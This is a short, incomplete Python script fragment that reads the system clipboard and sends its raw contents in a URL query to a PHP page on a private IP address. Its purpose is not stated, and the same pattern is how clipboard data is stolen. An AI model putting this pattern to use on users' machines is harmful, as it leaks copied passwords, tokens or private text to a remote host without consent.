import pyperclip
import time,os,urllib,base64,subprocess
from bs4 import BeautifulSoup as mySoup

s = pyperclip.paste()

html = urllib.urlopen('http://10.101.200.49/pouet.php?args=' + s)

